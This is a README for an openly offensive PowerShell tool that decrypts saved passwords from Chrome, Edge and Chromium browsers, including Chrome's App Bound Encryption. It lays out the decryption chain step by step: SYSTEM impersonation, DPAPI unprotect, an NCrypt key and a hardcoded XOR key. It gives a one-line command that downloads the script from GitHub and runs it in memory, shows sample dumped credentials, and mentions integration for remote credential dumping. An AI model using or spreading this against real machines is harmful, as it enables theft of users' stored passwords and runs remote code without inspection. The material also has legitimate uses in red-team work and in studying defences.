# Invoke-PowerChrome

A PowerShell script for decrypting Chromium-based browser passwords, supporting both v10 (DPAPI user) and Google Chrome v20 (App Bound Encryption) encrypted blobs.

The script dynamically interacts with Windows cryptographic APIs to decrypt passwords without external dependencies and can be executed in memory.

This code is based on the following PoC: https://github.com/runassu/chrome_v20_decryption
___

**Microsoft Edge / Chromium v10 Blobs**

Requirements
- No special privileges required
- Runs in current user context

Process Overview
- Read Local State file → get `os_crypt.encrypted_key`.
- Strip DPAPI prefix → DPAPI Unprotect (CurrentUser) → derive master key.
- AES-GCM decrypt password blobs in Login Data with the master key.

___

**Google Chrome v20 blobs (App Bound Encryption)**

Requirements
- Administrative rights (to impersonate SYSTEM)

Process Overview

- Read Local State file → get `os_crypt.app_bound_encrypted_key`
- Impersonate SYSTEM → DPAPI Unprotect (SYSTEM) → Rev2self → DPAPI Unprotect (CurrentUser).
- Parse flag-3 blob → extract `encrypted_aes_key`, `iv`, `ciphertext`, `tag`.
- Open NCrypt key "Google Chromekey1" → Decrypt → XOR with fixed 32-byte hardcoded key from `elevation_service.exe` → derive `aes_key`.
- AES-GCM decrypt (iv, ciphertext, tag) with `aes_key` → get `app_bound_key`.
- AES-GCM decrypt password blobs in Login Data with the `app_bound_key`.
___



## Usage

Load into memory
```powershell
IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX
```
> Example Commands
```powershell
Invoke-PowerChrome -Browser Chrome
Invoke-PowerChrome -Browser Chromium
Invoke-PowerChrome -Browser Edge

# Hide Banner
Invoke-PowerChrome -Browser Chrome -HideBanner

# Verbose
Invoke-PowerChrome -Browser Chrome -Verbose
```

> Example Output
```
    ____                          ________
   / __ \______      _____  _____/ ____/ /_  _________  ____ ___  ___
  / /_/ / __ \ | /| / / _ \/ ___/ /   / __ \/ ___/ __ \/ __ `__ \/ _ \
 / ____/ /_/ / |/ |/ /  __/ /  / /___/ / / / /  / /_/ / / / / / /  __/
/_/    \____/|__/|__/\___/_/   \____/_/ /_/_/   \____/_/ /_/ /_/\___/

Github: https://github.com/The-Viper-One/


[*] Microsoft Edge
[+] Decrypted Credentials

Target                 Username         Password
------                 --------         --------
https://tryhackme.com/ test@email.com   Password123-1!
https://tryhackme.com/ test_2@email.com L0ngAsFKP@ssW0rd

[*] Google Chrome
[+] Decrypted Credentials

Target                 Username                  Password
------                 --------                  --------
https://tryhackme.com/ test@Chrome_Browser.com   G0oGl3Chr0m3
https://tryhackme.com/ test_2@Chrome_Browser.com letmein
```


## Future Work
 Future updates will bring the following updates:

 - Cookie decryption
 - Decryption of profiles other than "default"
 - Additional Chromium-based browser support

## Integration with PsMapExec

This codebase has also been merged into [PsMapExec](https://github.com/The-Viper-One/PsMapExec/wiki/04-%E2%80%90-Modules#chromium) to support remote dumping of Chromium-based passwords.

## References

- https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/blob/main/docs/RESEARCH.md#5-alternative-decryption-vectors--chromes-evolving-defenses
- https://github.com/runassu/chrome_v20_decryption
- https://github.com/GhostPack/SharpDPAPI
